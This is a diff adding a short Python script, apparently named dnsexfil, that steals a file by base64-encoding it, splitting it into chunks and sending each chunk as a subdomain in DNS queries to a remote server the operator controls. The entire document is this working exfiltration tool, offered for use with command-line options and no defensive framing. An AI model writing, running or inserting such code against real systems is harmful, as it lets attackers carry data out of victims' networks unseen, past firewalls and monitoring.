@@ -1,0 +1,65 @@
+import dns.resolver
+import base64
+import socket
+import argparse
+import time
+import os
+import sys
+from os.path import exists
+
+# argparse for argument parsing
+parser = argparse.ArgumentParser(prog='dnsexfil', usage='%(prog)s [options]', description='Simple tool for data exfiltration through DNS requests')
+parser.add_argument('-s', '--server', action='store', type=str, required=True, help='Remote DNS server to forward the queries to')
+parser.add_argument('-d', '--domain', action='store', type=str, required=True, help='Domain to ask a resolution for')
+parser.add_argument('-t', '--timeout', action='store', type=int, required=False, help='DNS queries timout (default: 3s)')
+parser.add_argument('-f', '--file', action='store', type=str, required=True, help='Specify the file to exfil')
+parser.add_argument('-l', '--length', action='store', type=int, required=False, help='Specify exfiltration chunks length (default is 16)')
+
+args = parser.parse_args()
+
+# give a domain to ask for resolutin queries, timeout for query interval, file to exfil, server DNS (your lhost)
+domain = args.domain
+if not args.timeout:
+	timeout = 2
+file = args.file
+if not args.length:
+	n = 16
+else:
+	n = args.length
+server = args.server
+
+# Check if file exists
+if not exists(file):
+	sys.exit("File " + file + " does not exists")
+
+# Convert file's raw data into base64 string
+with open(file, 'rb') as rawdata:
+	b64data = base64.b64encode(rawdata.read()).decode()
+
+# Divide entire base64 string in smaller chunks
+splitted = [str(b64data)[index : index + n] for index in range(0, len(str(b64data)), n)]
+chunks = len(splitted)
+
+# Instanciate new resolver
+resolver = dns.resolver.Resolver()
+resolver.nameservers = [server]
+print("Instanciated new resolver on " + server)
+print("Chunks: " + str(chunks))
+print("Estimated Time: " + " (about " + str(5*chunks) + " seconds)")
+
+# for every chunk, ask the server for resolution of <chunk>.<domain> as if <chunk> were the third level domain of the main one
+for chunk in splitted:
+	try:
+		time.sleep(5)
+		query = str(chunk) + "." + domain
+		print("==> " + server + ":" + query)
+		a = resolver.resolve(query, 'A')
+		# Uncomment the following to print DNS resolution response
+		#for i in a.response.answer:
+		#	for j in i.items:
+		#		if hasattr(j, 'address'):
+		#			print(j.address)
+	except dns.exception.Timeout as e1:
+		print("TIMEOUT")
+	except Exception as e2:
+		pass
